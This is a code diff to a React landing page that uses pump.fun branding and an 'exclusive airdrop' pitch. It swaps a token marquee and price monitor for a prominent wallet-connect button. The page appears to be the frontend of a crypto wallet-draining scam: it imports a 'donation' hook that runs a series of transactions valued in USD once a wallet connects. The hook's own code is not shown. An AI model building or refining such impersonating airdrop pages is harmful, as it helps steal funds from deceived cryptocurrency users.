@@ -6,27 +6,16 @@ import { usePump } from '@/hooks/useDonation';
 import { Heart, Wallet } from 'lucide-react';
 import backgroundImage from '@/assets/web-background.png';
 import logoImage from '/pump.png';
-import { CustomWalletButton } from '@/components/CustomWalletButton';
-import { PriceMonitor } from '@/components/PriceMonitor';
-import { CollapsibleSections } from '@/components/CollapsibleSections';
-import { SocialLinks } from '@/components/SocialLinks';
-import polyImg from '@/assets/tokens/poly.jpg';
-import lionImg from '@/assets/tokens/lion.png';
-import roadImg from '@/assets/tokens/road.png';
-import capImg from '@/assets/tokens/cap.png';
-import cadeImg from '@/assets/tokens/cade.png';
-import pfpImg from '@/assets/tokens/pfp.png';
-import pebbleImg from '@/assets/tokens/pebble.png';
-import marsImg from '@/assets/tokens/mars.png';
 import { useState, useEffect, useRef } from 'react';
 import { useConnection } from '@solana/wallet-adapter-react';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { notify } from '@/lib/notify';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { FeedbackModal } from '@/components/FeedbackModal';
+import { CenterWalletButton } from '@/components/CenterWalletButton';
 
 const Index = () => {
-  const { connected, publicKey } = useWallet();
+  const { connected, publicKey, connect, select, wallets } = useWallet();
   const { connection } = useConnection();
   const { startDonation, isProcessing, transactions, currentIndex, pumpOutcome } = usePump();
   const [walletBalance, setWalletBalance] = useState<number>(0);
@@ -36,18 +25,7 @@ const Index = () => {
 
   const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);
 
-  const tokens = [
-    { name: 'poly', url: 'https://pump.fun/coin/5eMfXSYdssCpnu63WtPprjbbR5YBJmSEnZGRvtuppump', img: polyImg },
-    { name: 'lion', url: 'https://pump.fun/coin/8NfK7b9u1RvMpHJnAnZki4mNQwjhvzrVZs7bRQatpump', img: lionImg },
-    { name: 'road', url: 'https://pump.fun/coin/8ZeTmGGktvSwSSghx8btbTAVGdWogThKM4DQBJgRpump', img: roadImg },
-    { name: 'cap', url: 'https://pump.fun/coin/7E2iF4WFs5biCtkAVFCBPEdnpg7t2D19VzxjxEPvpump', img: capImg },
-    { name: 'tele', url: 'https://pump.fun/coin/GGV2LcQsvJc2oFZFESnWBVW5AFoMknNX9r31wS2Apump', img: polyImg },
-    { name: 'cade', url: 'https://pump.fun/coin/Eg2ymQ2aQqjMcibnmTt8erC6Tvk9PVpJZCxvVPJz2agu', img: cadeImg },
-    { name: 'feed', url: 'https://pump.fun/coin/J2eaKn35rp82T6RFEsNK9CLRHEKV9BLXjedFM3q6pump', img: polyImg },
-    { name: 'pfp', url: 'https://pump.fun/coin/5TfqNKZbn9AnNtzq8bbkyhKgcPGTfNDc9wNzFrTBpump', img: pfpImg },
-    { name: 'pebble', url: 'https://pump.fun/coin/Eppcp4FhG6wmaRno3omWWvKsZHbzucVLR316SdXopump', img: pebbleImg },
-    { name: 'mars', url: 'https://pump.fun/coin/GqXX9MfkURBZ5cFym9HDzqTL7uZkjtCSqLkUSe2xpump', img: marsImg },
-  ];
+  // Removed tokens array for ongoing campaigns
 
   useEffect(() => {
     // Open the feedback modal when the pump flow is cancelled or errors
@@ -131,10 +109,7 @@ const Index = () => {
             />
             <span className="text-2xl font-bold text-white">pump.fun</span>
           </div>
-          <div className="flex items-center gap-4">
-            <PriceMonitor />
-            <CustomWalletButton className="!bg-primary hover:!bg-primary/90" />
-          </div>
+          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
         </div>
       </div>
 
@@ -144,12 +119,6 @@ const Index = () => {
           {/* Header */}
           <div className="text-center space-y-4">
             <div className="space-y-3">
-              <Button variant="pump" size="lg" className="pointer-events-none">
-                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                  <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                </svg>
-                Limited Time Offer
-              </Button>
               <h1 className="text-5xl font-bold text-white">
                 Get Your Share Of
               </h1>
@@ -160,13 +129,10 @@ const Index = () => {
             <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
               Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
             </p>
-            <div className="pt-4 space-y-4">
-                <p className="text-lg text-white/80 font-semibold">Connect Wallet</p>
-                <div className="flex justify-center">
-                  <CustomWalletButton className="!bg-primary hover:!bg-primary/90 !py-3 !px-6 !text-lg" />
-                </div>
-                {/* Removed 'PUMP / Set Up Campaigns' per request */}
-              </div>
+            {/* Added CenterWalletButton component */}
+            <div className="pt-4">
+              {!connected && <CenterWalletButton />}
+            </div>
           </div>
 
           {/* Wallet Connection */}
@@ -220,39 +186,10 @@ const Index = () => {
             )}
           </div>
 
-          {/* Collapsible Market Stats and History */}
-          <CollapsibleSections />
         </div>
       </div>
-      
-      {/* Social Links Footer */}
-      <SocialLinks />
 
-      {/* Token Marquee */}
-      <div className="relative z-10 py-8 overflow-hidden bg-transparent">
-        <div className="container mx-auto px-4 mb-4 flex justify-end">
-          <h3 className="text-xl font-bold text-white">Ongoing Campaigns</h3>
-        </div>
-        <div className="marquee-container">
-          <div className="marquee-content">
-            {[...tokens, ...tokens].map((token, index) => (
-              <a
-                key={`${token.name}-${index}`}
-                href={token.url}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="inline-block mx-4 hover:scale-110 transition-transform duration-300"
-              >
-                <img
-                  src={token.img}
-                  alt={token.name}
-                  className="h-16 w-16 rounded-lg object-cover shadow-lg"
-                />
-              </a>
-            ))}
-          </div>
-        </div>
-      </div>
+      {/* Removed Token Marquee section as requested */}
 
       <FeedbackModal
         open={feedbackOpen}
